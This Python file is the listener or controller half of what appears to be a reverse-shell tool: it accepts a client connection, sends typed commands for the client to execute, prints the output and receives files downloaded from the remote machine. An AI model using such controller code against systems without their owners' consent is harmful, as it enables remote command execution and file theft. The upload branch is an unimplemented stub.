import socket
import os.path

SERVER_HOST = "127.0.0.1"
SERVER_PORT = 5003

BUFFER_SIZE = 1024
FORMAT = "utf-8"

# create a socket object
s = socket.socket()

# bind the socket to all IP addresses of this host
s.bind((SERVER_HOST, SERVER_PORT))
# make the PORT reusable
# when you run the server multiple times in Linux, Address already in use error will raise
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.listen(5)
print(f"Listening as {SERVER_HOST}:{SERVER_PORT} ...")

# accept any connections attempted
client_socket, client_address = s.accept()
print(f"{client_address[0]}:{client_address[1]} Connected!")

# just sending a message, for demonstration purposes
message = "Hello and Welcome".encode()
client_socket.send(message)

# valid_options = {"3", "upload", "2", "download", "1", "command"}
#
# while True:
#     print("1-command", "2-download", "3-upload", sep="\n")
#     work_flow = input("Enter your choice: ")
#
#     if work_flow in valid_options:
#         print(f"You chose option {work_flow}")
#         break
#     else:
#         print("Invalid choice. Please choose between shown choices.")
#
# if work_flow in {"1", "command"}:
while True:
    # get the command from prompt
    command = input("Enter the command you wanna execute:")
    # send the command to the client
    client_socket.send(command.encode())
    if command.lower() == "exit":
        # if the command is exit, just break out of the loop
        break
    elif command.split()[0].lower() == "download":
        [_, _, destination] = command.split()
        """ Receiving the filename from the client. """
        filename = client_socket.recv(BUFFER_SIZE).decode(FORMAT)
        print(f"[RECV] Receiving the filename.")
        client_socket.send("name rece".encode(FORMAT))

        file = open(os.path.join(destination, filename), "a")
        """ Receiving the file data from the client. """
        while True:
            print("before")
            data = client_socket.recv(BUFFER_SIZE).decode(FORMAT)
            print("after")
            print(data)
            if data == "END":
                break
            file.write(data)

        print(f"[RECV] Receiving the file data.")
        client_socket.send("File data received".encode(FORMAT))
        """ Closing the file. """
        file.close()

    elif command.split()[0].lower() == "upload":
        [_, file_path, destination] = command.split()
    else:
        # retrieve command results
        results = client_socket.recv(BUFFER_SIZE).decode()
        # print them
        print(results)

# close connection to the client
client_socket.close()
# close server connection
s.close()
